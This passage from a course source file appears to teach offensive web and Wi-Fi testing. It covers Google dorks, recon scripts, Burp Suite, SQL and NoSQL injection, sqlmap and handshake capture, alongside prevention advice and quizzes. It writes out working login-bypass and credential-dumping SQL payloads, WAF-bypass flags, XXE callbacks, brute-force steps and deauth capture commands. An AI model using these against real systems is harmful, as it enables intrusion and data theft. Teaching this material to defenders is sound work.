# intext:           Word must appear in page body
# cache:            Show Google's cached version
# link:             Pages linking to a URL (deprecated)

# Find admin panels
site:target.com inurl:admin

# Find exposed documents
site:target.com filetype:pdf OR filetype:docx OR filetype:xlsx

# Find login pages
site:target.com inurl:login OR inurl:signin OR intitle:"Login"

# Find exposed configuration files
site:target.com filetype:env OR filetype:cfg OR filetype:conf

# Find error messages that reveal info
site:target.com "Fatal error" OR "Warning:" OR "Notice:"

# Find directory listings
site:target.com intitle:"index of"
\`\`\`

**Google Hacking Database (GHDB) — pre-built dorks:**
\`\`\`bash
# Find exposed phpMyAdmin
intitle:phpmyadmin "Welcome to phpMyAdmin" inurl:main.php

# Find web shells already on servers
intitle:"web shell" OR intitle:"c99 shell" OR intitle:"r57 shell"

# Find exposed WordPress configs
inurl:wp-config.php intext:"DB_USER"

# Find exposed .git repositories
inurl:.git intitle:"index of" HEAD

# Find open FTP servers
intitle:"index of" inurl:ftp

# Find security cameras
inurl:"/view.shtml" intitle:"Live View"
\`\`\`

**Automate Google dorking:**
\`\`\`bash
# Use a tool like dorkbot or pagodo
# git clone https://github.com/opsdisk/pagodo.git

# Manual dorking loop (check multiple dorks)
for dork in "inurl:admin" "filetype:env" "intitle:login"; do
    echo "Checking: $dork"
    # You'd use a script to query Google here
done
\`\`\`

**Operational security when dorking:**
- Use a VPN or Tor — Google tracks searches
- Don't click on results unless authorized
- Document findings with screenshots
- Google may block automated queries — use delays

Dorking is completely passive. The target never knows you searched for them.`),

    l('recon-8', 'Automating Recon with Scripts',
      `Manual recon is educational. Automated recon is practical. Build your own recon pipeline.

**Build a simple recon script:**
\`\`\`bash
#!/bin/bash
# basic-recon.sh — automated recon pipeline

TARGET=$1
OUTPUT_DIR="recon-$(echo $TARGET | tr -d '/')"

mkdir -p $OUTPUT_DIR

echo "[*] Starting recon on $TARGET"
echo "[*] Output: $OUTPUT_DIR/"

# Phase 1: DNS Enumeration
echo "[*] Phase 1: DNS Enumeration"
dig $TARGET ANY +short > $OUTPUT_DIR/dns.txt 2>/dev/null
dig $TARGET MX +short >> $OUTPUT_DIR/dns.txt 2>/dev/null

# Phase 2: Subdomain Discovery
echo "[*] Phase 2: Subdomain Discovery"
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sort -u > $OUTPUT_DIR/subdomains.txt

# Phase 3: Technology Detection
echo "[*] Phase 3: Technology Detection"
curl -sI "https://$TARGET" > $OUTPUT_DIR/headers.txt 2>/dev/null
whatweb $TARGET > $OUTPUT_DIR/tech.txt 2>/dev/null

# Phase 4: Port Scan (basic)
echo "[*] Phase 4: Port Scan"
nmap -F -T4 $TARGET -oN $OUTPUT_DIR/ports.txt 2>/dev/null

echo "[+] Done! Check $OUTPUT_DIR/ for results."
\`\`\`

**Use parallel execution for speed:**
\`\`\`bash
#!/bin/bash
# Fast subdomain check with xargs

TARGET=$1
SUBDOMAIN_LIST=$2

cat $SUBDOMAIN_LIST | xargs -P50 -I{} sh -c '
    host "{}.$1" > /dev/null 2>&1 && echo "{}.$1 resolves"
' _ $TARGET
\`\`\`

**Recon-ng workflow:**
\`\`\`bash
# Recon-ng is a full recon framework
recon-ng

# Within recon-ng:
marketplace refresh
marketplace search github
marketplace install recon/domains-contacts/whois_pocs
modules load recon/domains-hosts/certificate_transparency
options set SOURCE target.com
run
\`\`\`

**Screenshot tools for visual recon:**
\`\`\`bash
# Install eyewitness or gowitness
# Take screenshots of all discovered web servers

# With gowitness:
gowitness scan file -f $OUTPUT_DIR/live-hosts.txt --threads 5

# With eyewitness:
eyewitness --web -f $OUTPUT_DIR/live-hosts.txt --threads 5 --no-prompt
\`\`\`

**Keep your recon organized:**
\`\`\`bash
# Standard directory structure
mkdir -p recon/{passive,active,screenshots,reports}

# Name files consistently
# YYYY-MM-DD_target_scan_type.txt
recon/passive/2024-01-15_target_subdomains.txt
recon/active/2024-01-15_target_nmap.txt
\`\`\``),
  ],

  'burp-suite-101': [
    l('burp-1', 'What is Burp Suite?',
      `**Burp Suite** is the most widely used web application security testing tool. It sits between your browser and the target server, letting you intercept, inspect, and modify all HTTP traffic.

Burp Suite Community Edition (free) includes:

- **Proxy** — intercepts requests between browser and server
- **Repeater** — resend and manually tweak requests
- **Intruder** — automated fuzzing and brute-force attacks
- **Decoder** — encode/decode data (Base64, URL, hex)
- **Target** — site map and scope management

Burp Suite Professional adds a web vulnerability scanner and advanced features.

Download the free Community Edition from portswigger.net. Java is required to run it.

\`\`\`bash
# Run Burp Suite (after downloading)
java -jar burpsuite_community.jar
\`\`\``),

    l('burp-2', 'Setting Up the Proxy',
      `Burp's **Proxy** is the core feature. It captures HTTP traffic between your browser and the target.

**Step 1: Configure Burp as a proxy**
1. Open Burp Suite → Proxy → Proxy Settings
2. Default listener: \`127.0.0.1:8080\`
3. Make sure "Intercept is on"

**Step 2: Configure your browser**

In Firefox:
1. Settings → Network Settings → Manual proxy
2. HTTP Proxy: \`127.0.0.1\` Port: \`8080\`
3. Check "Also use this proxy for HTTPS"

**Step 3: Install Burp's CA certificate**

For HTTPS traffic, Burp needs to decrypt the SSL/TLS:
1. Visit \`http://burpsuite\` in the configured browser
2. Download \`cacert.cer\`
3. Firefox: Settings → Privacy & Security → Certificates → Import
4. Check "Trust this CA to identify websites"

Now all your traffic flows through Burp:

\`\`\`bash
# Every request appears in Burp's Intercept tab
# Press "Forward" to send it to the server
# Press "Drop" to discard it
\`\`\`

You can now see, modify, or block every request before it reaches the server.`),

    l('burp-3', 'Intercepting Requests',
      `With the proxy running, you can **intercept** requests and modify them in real time before they reach the server.

When you submit a form or click a link, Burp pauses the request:

\`\`\`http
POST /login HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc

username=admin&password=secret123
\`\`\`

You can edit anything before forwarding:
- Change \`username\` to \`admin' OR '1'='1\` (SQL injection test)
- Change \`role=user\` to \`role=admin\`
- Modify \`Cookie\` values
- Add or remove headers
- Change HTTP method (\`GET\` to \`POST\`)

\`\`\`http
# Modified request with SQL injection
POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin' --&password=
\`\`\`

**Keyboard shortcuts:**
- \`Forward\` — send the modified request
- \`Drop\` — discard the request
- \`Action\` — send to Repeater, Intruder, or other tools
- Toggle Intercept on/off with the big "Intercept is on" button

Use the **Target** tab to see the site map — every page and resource Burp has seen.`),

    l('burp-4', 'Repeater Tool',
      `**Repeater** allows you to take a request, modify it, and resend it multiple times. This is useful for exploring how a server responds to different inputs.

Send a request to Repeater:
1. Intercept a request (or find one in HTTP History)
2. Right-click → "Send to Repeater" (or press Ctrl+R)

In Repeater:
\`\`\`http
GET /api/user?id=1 HTTP/1.1
Host: target.com
\`\`\`

Click "Send" to see the response. Then modify:

\`\`\`http
GET /api/user?id=2 HTTP/1.1
Host: target.com
\`\`\`

Click "Send" again. Compare responses. This is called **IDOR testing** — checking if you can access another user's data by changing an ID parameter.

**Use cases for Repeater:**
- Test parameter tampering (\`?admin=true\`, \`?debug=1\`)
- Test SQL injection variants
- Try different HTTP methods
- Manipulate headers (\`X-Forwarded-For: 127.0.0.1\`)
- Test rate limiting by sending rapid requests

Each request and response stays in its own tab so you can compare results side by side.`),

    l('burp-5', 'Intruder Tool',
      `**Intruder** automates attacks by sending many requests with different payloads. It's used for brute-force attacks, fuzzing, and parameter enumeration.

**Setup:**
1. Send a request to Intruder (right-click → "Send to Intruder")
2. Highlight the parameter you want to fuzz and click "Add §" (or just highlight and hit Ctrl+Space, then the auto-selected positions appear with §)
3. The payload position is marked with \`§\`:

\`\`\`http
GET /api/user?id=§1§ HTTP/1.1
\`\`\`

4. Go to the "Payloads" tab
5. Choose a payload type (Simple list, Numbers, Brute force, etc.)
6. Add payloads or load a wordlist

**Attack types:**
- **Sniper** — one payload position, one payload set (default)
- **Battering ram** — same payload into multiple positions
- **Pitchfork** — different payloads for different positions
- **Cluster bomb** — every combination of multiple payload sets

\`\`\`http
# Example: fuzzing for hidden files
GET /§FUZZ§ HTTP/1.1
Host: target.com

# Payload list: admin, backup, test, .git, .env, config
\`\`\`

Results are color-coded by response length and status code. Different responses often indicate valid discoveries.

**Rate limiting:** Intruder is fast. Use "Resource pool" to set delays if you don't want to overwhelm the target or get blocked.`),

    l('burp-6', 'Practical Exercise',
      `Let's walk through a real test scenario.

**Target:** \`http://testphp.vulnweb.com\` (a deliberately vulnerable site from Acunetix)

\`\`\`bash
# Open this URL in your Burp-configured browser
http://testphp.vulnweb.com
\`\`\`

**Exercise 1: Intercept a login form**
1. Navigate to the site
2. Find a login or search form
3. Intercept the POST request
4. Try modifying the input (add special characters, change values)
5. Forward and observe the response

**Exercise 2: Use Repeater for parameter fuzzing**
1. Send a \`GET /product.php?id=1\` request to Repeater
2. Change \`id\` to different values (2, 3, 10, ' , -1)
3. Observe which responses contain different data
4. Look for SQL error messages (they indicate SQL injection)

**Exercise 3: Intruder brute-force**
1. Find a login form
2. Send it to Intruder
3. Set username as fixed (\`admin\`) and password as payload position
4. Use a small password list (common passwords)
5. Run the attack and look for different response lengths

**What to look for:**
- \`500\` errors — server-side issues that might leak information
- Different response lengths — could indicate valid credentials
- SQL errors in responses — potential SQL injection
- Stack traces — reveal technology and file paths
- \`Set-Cookie\` headers — session handling behavior

The more you practice with Burp, the more patterns you'll recognize in web applications.`, { hasQuiz: true, quiz: [
        { id: 'burp-6-q1', question: 'What is the difference between Burp Repeater and Intruder?', options: ['Repeater is for manual tests, Intruder for automated', 'Repeater is faster', 'Intruder is for proxy only', 'They do the same thing'], correctIndex: 0, explanation: 'Repeater sends one request at a time for manual testing. Intruder automates many requests with different payloads.' },
        { id: 'burp-6-q2', question: 'What does a different response length in Intruder results indicate?', options: ['Server error', 'Possible valid finding', 'Network issue', 'Rate limiting'], correctIndex: 1, explanation: 'Different response lengths often indicate a different server response, which can mean a valid discovery like a found directory or correct credential.' },
      ] }),

    l('burp-7', 'Burp Collaborator & Out-of-Band Testing',
      `Burp Collaborator is a service that detects out-of-band vulnerabilities like blind XXE, SSRF, and blind SQLi.

**What is Collaborator?**
\`\`\`
Burp Collaborator generates unique subdomains that Burp controls.
If a vulnerability causes the target to make a request to that
subdomain, Burp captures it — even though you never see the response.

This is critical for:
- Blind SQL injection (time-based is slow, out-of-band is instant)
- Blind XXE (force XML parser to fetch external DTD)
- SSRF (make server request your Collaborator server)
- Blind XSS (force browser to ping Collaborator)
\`\`\`

**Using Collaborator:**
1. In Burp Suite: Burp → Burp Collaborator client
2. Click "Copy to clipboard" — you get a unique URL
3. Inject that URL into a potential vulnerability:
\`\`\`http
POST /api/xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-ID.burpcollaborator.net">
]>
<search>&xxe;</search>
\`\`\`
4. Click "Poll now" — if the server made a request, you'll see it

**Automated collaborator checks:**
Many Burp Scanner checks automatically use Collaborator to detect out-of-band vulnerabilities. This is why Burp Professional is so effective at finding blind vulnerabilities.`),

    l('burp-8', 'Burp Extensions & BApp Store',
      `Burp's functionality can be extended with plugins from the BApp Store.

**Installing extensions:**
1. Burp → Extender → BApp Store
2. Browse or search for extensions
3. Click "Install"

**Essential extensions for web testing:**
\`\`\`
1. CO2 — SQLi and auth testing macros
2. Autorize — automated authorization testing
3. Logger++ — enhanced HTTP logging with search
4. Turbo Intruder — ultra-fast brute-forcing (Python-based)
5. Content Type Converter — convert request formats
6. ActiveScan++ — enhanced active scanning
7. JWT Editor — decode and forge JWT tokens
8. JSON Web Tokens — JWT attack toolkit
9. Request Timer — measure response times for timing attacks
10. Collaborator Everywhere — add Collaborator URLs to headers
\`\`\`

**Using Turbo Intruder:**
Turbo Intruder uses Python scripts for maximum speed:
\`\`\`python
def queueRequests(target, wordlist):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100)

    for word in wordlist:
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
\`\`\`

**Writing your own extensions:**
Burp extensions can be written in Java, Python (via Jython), or Ruby (via JRuby). The Montoya API (Burp v2023+) provides a modern interface for building extensions.`),

    l('burp-9', 'Advanced Burp Techniques',
      `Master these techniques to level up your Burp Suite skills.

**Match and Replace — auto-modify requests:**
\`\`\`
Proxy → Options → Match and Replace
Automatically modify requests/responses as they pass through:

Match: ^User-Agent:.*$  →  Replace: User-Agent: Googlebot/2.1
Match: Cookie:           →  Replace: Cookie: session=admin

Useful for:
- Spoofing User-Agent on every request
- Removing CSP headers to test XSS
- Bypassing client-side restrictions
\`\`\`

**Session handling rules — automate authentication:**
\`\`\`
Proxy → Options → Session Handling Rules

Create a rule that:
1. Checks if a request returns 302 (redirect to login)
2. If so, posts to the login endpoint
3. Captures the new session cookie
4. Retries the original request with the new cookie

This lets you run Intruder attacks that automatically re-authenticate.
\`\`\`

**Scope and filtering — reduce noise:**
\`\`\`bash
# Set target scope:
# Target → Scope → "Use advanced scope control"
# Add exactly the hosts you want to test

# Filter HTTP History:
# Proxy → HTTP History → Filter bar
# Show only: requests within scope, certain MIME types, certain status codes
\`\`\`

**Comparer — spot the difference:**
\`\`\`
Use Comparer to:
- Compare responses from different parameter values
- Compare responses before and after login
- Spot differences in timing, content length, or error messages
- Identify blind SQLi by comparing true/false responses

Send two responses to Comparer (right-click → "Send to Comparer")
It highlights the exact differences. \`\`\``),
  ],

  'sql-injection-101': [
    l('sql-1', 'What is SQL?',
      `**SQL** (Structured Query Language) is how programs talk to databases. Websites use SQL to store users, products, posts, and everything else.

A database has **tables** (like spreadsheets), each with **columns** and **rows**.

\`\`\`sql
-- Example: a users table
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL
);
\`\`\`

To get data:

\`\`\`sql
SELECT * FROM users;
\`\`\`

To get specific data:

\`\`\`sql
SELECT username, email FROM users WHERE id = 1;
\`\`\`

Web applications build SQL queries from user input. If they don't sanitize that input, you can inject your own SQL commands.

\`\`\`bash
# If you have SQLite installed, try:
sqlite3 test.db "CREATE TABLE users (id INT, name TEXT);"
sqlite3 test.db "INSERT INTO users VALUES (1, 'admin');"
sqlite3 test.db "SELECT * FROM users;"
\`\`\``),

    l('sql-2', 'SELECT & WHERE',
      `The \`SELECT\` statement retrieves data. The \`WHERE\` clause filters it.

\`\`\`sql
-- Get all data
SELECT * FROM users;

-- Get specific columns
SELECT username, password FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE username = 'admin';

-- Match patterns with LIKE
SELECT * FROM users WHERE email LIKE '%@company.com';

-- Combine conditions
SELECT * FROM products
WHERE price > 100 AND category = 'electronics';
\`\`\`

A typical login query looks like:

\`\`\`sql
SELECT * FROM users
WHERE username = 'admin' AND password = 'secret123';
\`\`\`

If this returns any row, the login succeeds. If it returns no rows, login fails.

The problem: the application directly inserts user input into the query:

\`\`\`python
# Vulnerable code — NEVER do this
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
\`\`\`

The user input becomes part of the SQL command itself, not just a value. This is the root of SQL injection.`),

    l('sql-3', 'SQL Injection Discovery',
      `Finding SQL injection points is often as simple as typing a single quote (\`'\`).

When you enter \`'\` into a vulnerable form, the query becomes:

\`\`\`sql
SELECT * FROM users WHERE username = ''' AND password = 'x'
\`\`\`

The extra \`'\` breaks the string, causing a SQL syntax error. If the application shows an error, you've found a SQL injection.

**Test payloads:**

\`\`\`
'           -- Single quote (breaks the string)
''          -- Double quote (escaped quote — might work)
"           -- Double quote for databases that use them
')          -- Close the string and parenthesis
1' OR '1'='1   -- Always-true condition
1' --       -- Comment out the rest of the query
\`\`\`

**Error-based detection:**

If you see an error like:
\`\`\`
You have an error in your SQL syntax; check the manual...
\`\`\`

That's a SQL injection point. The database is telling you exactly where and how the query broke.

**Blind detection:**
If errors are hidden, use boolean-based tests:

\`\`\`sql
-- If both return the same response, SQLi is likely
www.site.com/page?id=1' AND '1'='1
www.site.com/page?id=1' AND '1'='2
\`\`\`

Different responses (one works, one doesn't) confirm SQL injection exists.`),

    l('sql-4', 'Bypassing Authentication',
      `The classic SQL injection attack: bypassing login.

A vulnerable login query:

\`\`\`sql
SELECT * FROM users
WHERE username = 'INPUT' AND password = 'INPUT2'
\`\`\`

Enter this as the username:

\`\`\`
admin' OR '1'='1
\`\`\`

The query becomes:

\`\`\`sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1' AND password = 'whatever'
\`\`\`

Since \`OR '1'='1'\` is always true, the query returns the first user (usually admin).

**Even simpler:**

\`\`\`
' OR 1=1 --
\`\`\`

\`\`\`sql
SELECT * FROM users
WHERE username = '' OR 1=1 --' AND password = 'x'
\`\`\`

The \`--\` comments out the rest of the query. \`1=1\` is always true. You're logged in as the first user.

**Comment syntax by database:**

\`\`\`sql
--  SQL comment (works in MySQL, PostgreSQL, SQLite)
#    MySQL specific comment
/* */ Block comment (works in most databases)
\`\`\`

Always test with different comment styles when one doesn't work.`),

    l('sql-5', 'Extracting Data with UNION',
      `Once you've found a SQL injection, the \`UNION\` operator lets you extract data from other tables.

\`\`\`sql
-- UNION combines results from two SELECT statements
SELECT name, email FROM users
UNION
SELECT title, body FROM posts;
\`\`\`

Both SELECTs must return the **same number of columns**.

**Step 1: Find the number of columns**

\`\`\`sql
' ORDER BY 1 --   (if error, keep going)
' ORDER BY 2 --   (no error? try 3)
' ORDER BY 3 --   (no error? try 4)
\`\`\`

When you get an error, the previous number was the column count.

Or use UNION with NULLs:

\`\`\`sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
\`\`\`

No error = that many columns.

**Step 2: Extract data**

\`\`\`sql
-- Get database version
' UNION SELECT 1, version(), 3 --

-- Get table names (MySQL)
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --

-- Get column names from users table
' UNION SELECT 1, column_name, 3 FROM information_schema.columns
  WHERE table_name='users' --

-- Dump credentials
' UNION SELECT 1, username, password FROM users --
\`\`\`

**For SQLite:**

\`\`\`sql
-- Get SQLite version
' UNION SELECT 1, sqlite_version(), 3 --

-- Get all tables
' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --

-- Get table schema
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='users' --
\`\`\`

Always extract the schema first so you know the table and column names.`),

    l('sql-6', 'Prevention & Mitigation',
      `The only real defense against SQL injection is **parameterized queries** (also called prepared statements).

**Vulnerable code (NEVER do this):**

\`\`\`python
# Python with raw string formatting — DANGEROUS
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
\`\`\`

**Safe code (parameterized query):**

\`\`\`python
# Python with parameterized query — SAFE
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
\`\`\`

The \`?\` is a placeholder. The database treats \`username\` as data, not as part of the SQL command. Even if someone enters \`' OR '1'='1\`, it's treated as a literal string to search for, not as SQL code.

**In other languages:**

\`\`\`java
// Java with PreparedStatement — SAFE
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
\`\`\`

\`\`\`php
// PHP with PDO — SAFE
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
\`\`\`

**Additional defenses:**
- **Input validation** — reject unexpected characters
- **Least privilege** — database accounts should have minimal permissions
- **WAF** — Web Application Firewall can block known attack patterns
- **Regular security testing** — scan your applications for SQL injection

SQL injection is preventable. Every modern programming language supports parameterized queries. There is never a valid reason to concatenate user input into SQL queries.`, { hasQuiz: true, quiz: [
        { id: 'sql-6-q1', question: 'Why are parameterized queries safe against SQL injection?', options: ['They encrypt the query', 'User input is treated as data, not SQL code', 'They use a different database', 'They block all input'], correctIndex: 1, explanation: 'Parameterized queries send user input as data, separate from the SQL command structure.' },
        { id: 'sql-6-q2', question: 'What is the best defense against SQL injection?', options: ['Input validation', 'WAF', 'Parameterized queries', 'Encryption'], correctIndex: 2, explanation: 'Parameterized queries are the definitive defense as they fundamentally separate code from data.' },
      ] }),

    l('sql-7', 'Blind SQL Injection',
      `Sometimes the application doesn't show errors or return data. Blind SQLi uses true/false questions or time delays to extract data one bit at a time.

**Boolean-based blind SQLi:**
\`\`\`bash
# Test for boolean-based injection (page responds differently to true vs false)
curl "http://target.com/item?id=1' AND '1'='1"
curl "http://target.com/item?id=1' AND '1'='2"

# Extract data with boolean questions
curl "http://target.com/item?id=1' AND SUBSTRING(database(),1,1)='m' -- "
\`\`\`

**Time-based blind SQLi:**
\`\`\`bash
# MySQL
curl "http://target.com/item?id=1' AND SLEEP(5) -- "

# PostgreSQL
curl "http://target.com/item?id=1' AND (SELECT pg_sleep(5)) -- "

# MS SQL Server
curl "http://target.com/item?id=1'; WAITFOR DELAY '0:0:5' -- "
\`\`\`

**Extract data using time:**
\`\`\`bash
# Check first character of database name
curl "http://target.com/item?id=1' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(3), 0) -- "
\`\`\``),

    l('sql-8', 'NoSQL Injection',
      `Modern apps use MongoDB and other NoSQL databases. They have their own injection patterns.

**MongoDB injection:**
\`\`\`bash
# Test with JSON operators
curl -d 'username[$ne]=&password[$ne]=' https://target.com/login

# JSON content type
curl -X POST -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}' \
  https://target.com/login
\`\`\`

**MongoDB operators:**
- \`$ne\` — not equal (match everything)
- \`$gt\` — greater than
- \`$regex\` — pattern matching
- \`$where\` — JavaScript expression (code injection!)

Prevention: validate input types strictly. Never pass user input directly into MongoDB queries.`),

    l('sql-9', 'Second-Order SQL Injection',
      `Second-order SQLi stores the payload, then triggers it later.

**How it works:**
\`\`\`bash
# Step 1: Register with malicious username "admin' --"
# Step 2: Data stored in database
# Step 3: Later, profile page uses username in a query:
# SELECT * FROM users WHERE username = 'admin' -- '
# Now viewing admin's data!
\`\`\`

**Why it's hard to find:**
- Payload goes through two different code paths
- Automated scanners rarely maintain state across requests
- Registration code may escape differently than profile code

**Prevention:** Parameterize ALL queries — even those using data from the database.`),

    l('sql-10', 'SQL Injection Automation with sqlmap',
      `Sqlmap automates SQL injection detection and exploitation.

\`\`\`bash
# Basic detection
sqlmap -u "http://target.com/item?id=1"

# Load request from Burp
sqlmap -r request.txt

# List databases
sqlmap -u "http://target.com/item?id=1" --dbs

# Dump a table
sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump

# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment

# Check if DBA
sqlmap -u "http://target.com/item?id=1" --is-dba
\`\`\`

Master sqlmap to automate the tedious parts of SQL injection testing, but always understand what it's doing under the hood.`, { hasQuiz: true, quiz: [
        { id: 'sql-10-q1', question: 'Which sqlmap flag dumps all tables from all databases?', options: ['--dump', '--dump-all', '--all', '--extract'], correctIndex: 1, explanation: '--dump-all dumps all tables from all databases. Use with caution — it generates a lot of data.' },
        { id: 'sql-10-q2', question: 'What does --tamper=space2comment do?', options: ['Speeds up the scan', 'Replaces spaces with comments to bypass WAF', 'Adds delays', 'Encrypts payloads'], correctIndex: 1, explanation: 'space2comment replaces space characters with /**/ comments, which can bypass simple WAF rules that look for spaces in SQL keywords.' },
      ] }),
  ],

  'wifi-fundamentals-101': [
    l('wf-1', 'How Wi-Fi Works',
      `Wi-Fi uses **radio waves** to transmit data between devices. Instead of cables, data travels through the air at specific frequencies.

Every Wi-Fi network has:
- **SSID** — the network name you see (e.g., "HomeWiFi")
- **BSSID** — the MAC address of the access point (router)
- **Channel** — the specific frequency used for transmission
- **Band** — 2.4 GHz or 5 GHz

**How devices connect:**
1. Device scans for nearby SSIDs (probe request)
2. Access point responds (probe response)
3. Device sends authentication request
4. Access point authenticates the device
5. Device associates with the network
6. If WPA2 is enabled, the 4-way handshake begins

\`\`\`bash
# Linux: see nearby Wi-Fi networks
iwlist wlan0 scan | grep -E "ESSID|Channel|Signal"

# Or with nmcli
nmcli dev wifi list
\`\`\`

These commands show all visible networks, their signal strength, channel, and security type.`),

    l('wf-2', '2.4 GHz vs 5 GHz',
      `Wi-Fi operates on two main frequency bands, each with trade-offs.

**2.4 GHz:**
- **Range** — better through walls and obstacles
- **Speed** — slower (max ~600 Mbps theoretical)
- **Channels** — 11-14 channels (only 3 non-overlapping: 1, 6, 11)
- **Interference** — crowded (Bluetooth, microwaves, cordless phones)

**5 GHz:**
- **Range** — shorter, worse through walls
- **Speed** — faster (max ~1.3 Gbps theoretical)
- **Channels** — more channels, less congestion
- **Interference** — less crowded

\`\`\`bash
# Check which band you're connected to (Linux)
iwconfig wlan0 | grep -E "Frequency|Bit Rate"

# Check signal strength
iw dev wlan0 link
\`\`\`

Output shows the frequency (2.4xxx = 2.4 GHz, 5.xxx = 5 GHz) and signal quality in dBm. Signals above \`-70 dBm\` are considered good. Weaker than \`-80 dBm\` means poor connectivity.

**Wi-Fi standards:**
- **802.11b/g/n** — 2.4 GHz (legacy)
- **802.11a/n/ac** — 5 GHz (modern)
- **802.11ax (Wi-Fi 6)** — both bands (latest)`),

    l('wf-3', 'WPA2 & WPA3',
      `**WPA2** (Wi-Fi Protected Access 2) has been the standard since 2004. It uses AES encryption and requires a **pre-shared key (PSK)** — the Wi-Fi password.

**The 4-Way Handshake:**
When a device connects to WPA2:
1. AP sends a random number (ANonce) to the client
2. Client responds with its own random number (SNonce) + a computed value
3. AP sends its computed value + the group key
4. Client confirms

An attacker who captures this handshake can attempt to crack the password offline.

\`\`\`bash
# Capture WPA2 handshake with airodump-ng (Linux, requires monitor mode)
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# Target a specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
\`\`\`

**WPA3** is the newer standard (2018). It uses SAE (Simultaneous Authentication of Equals) instead of PSK, making offline cracking much harder.

**WEP** is the old, broken standard. It's trivially crackable in minutes. Never use WEP. Any network still using WEP in 2026 is extremely vulnerable.

\`\`\`bash
# Check encryption type of nearby networks
nmcli dev wifi list | grep -E "WPA2|WPA3|WEP"
\`\`\``),

    l('wf-4', 'Wireless Reconnaissance',
      `Wireless recon uses tools to discover and analyze nearby networks.

**Essential tools on Linux:**

\`\`\`bash
# iwlist — scan for networks
sudo iwlist wlan0 scan

# airodump-ng — detailed network capture (install aircrack-ng first)
sudo airmon-ng start wlan0    # Enable monitor mode
sudo airodump-ng wlan0mon     # Start capturing
\`\`\`

**What airodump-ng shows:**
\`\`\`
BSSID              PWR  Beacons  #Data  CH  ENC  ESSID
AA:BB:CC:DD:EE:FF  -65   120     42     6  WPA2 HomeWiFi
11:22:33:44:55:66  -72   95      18     1  WPA2 OfficeNet
\`\`\`

- **BSSID** — MAC address of the access point
- **PWR** — signal strength (higher = closer)
- **CH** — channel
- **ENC** — encryption type
- **ESSID** — network name

\`\`\`bash
# Kismet — full-featured wireless sniffer and IDS
sudo kismet

# Wash — detect WPS-enabled networks (install reaver)
sudo wash -i wlan0mon
\`\`\`

**WPS (Wi-Fi Protected Setup)** is a feature that allows PIN-based connection. Many routers have WPS enabled, and the PIN can be brute-forced with tools like \`reaver\` or \`bully\`.`),

    l('wf-5', 'Security Best Practices',
      `Protecting your wireless network is essential. Here's how to secure it.

**For home users:**

\`\`\`bash
# 1. Use WPA2 or WPA3 (never WEP)
# 2. Use a strong password (12+ characters)
# 3. Disable WPS (Wi-Fi Protected Setup)
# 4. Disable SSID broadcasting? (minor benefit, but not real security)
# 5. Enable MAC address filtering (easily bypassed, but adds a layer)
# 6. Keep router firmware updated
# 7. Change default admin credentials
\`\`\`

**Strong password examples:**
\`\`\`
Good:       J8#mKp2$vL9@nQ5x
Bad:        password123
Worse:      admin
\`\`\`

**Why WPS is dangerous:**
WPS PINs are 8 digits. The last digit is a checksum, so only 7 digits need to be guessed. The protocol validates the first 4 digits separately, reducing the search space to 10,000 + 1,000 = 11,000 possible combinations. A tool like \`reaver\` can crack this in 4-10 hours.

\`\`\`bash
# Check if WPS is enabled on your network (requires monitor mode)
sudo wash -i wlan0mon
\`\`\`

**Enterprise security:**
- Use WPA2-Enterprise with 802.1X authentication instead of PSK
- Deploy a RADIUS server for centralized authentication
- Use EAP-TLS with client certificates for the strongest security
- Regularly audit connected devices

Many organizations also deploy **wireless intrusion detection systems (WIDS)** to detect rogue access points and deauthentication attacks.`, { hasQuiz: true, quiz: [
        { id: 'wf-5-q1', question: 'Why is WPS considered insecure?', options: ['It uses weak encryption', 'The PIN can be brute-forced in hours due to flawed design', 'It only works with WEP', 'It requires a password manager'], correctIndex: 1, explanation: 'WPS PIN validation splits the 8-digit PIN into two halves, making it brute-forceable in 4-10 hours.' },
        { id: 'wf-5-q2', question: 'What is the minimum recommended Wi-Fi security standard in 2026?', options: ['WEP', 'WPA', 'WPA2', 'WPS'], correctIndex: 2, explanation: 'WPA2 with AES is the minimum acceptable standard. WPA3 is preferred where available.' },
      ] }),

    l('wf-6', 'Deauthentication Attacks & Capture',
      `A **deauth attack** disconnects a client from a Wi-Fi network by sending spoofed deauthentication frames. This is used to capture the WPA2 4-way handshake for offline cracking.

**How deauth frames work:**
Wi-Fi management frames (including deauth) are **unencrypted** in WPA2. An attacker can forge these frames without knowing the password.

\`\`\`bash
# Step 1: Enable monitor mode
sudo airmon-ng start wlan0

# Step 2: Find target network and client
sudo airodump-ng wlan0mon

# Step 3: Capture traffic from target (records to capture-01.cap)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: In another terminal, send deauth packets (0 = continuous)
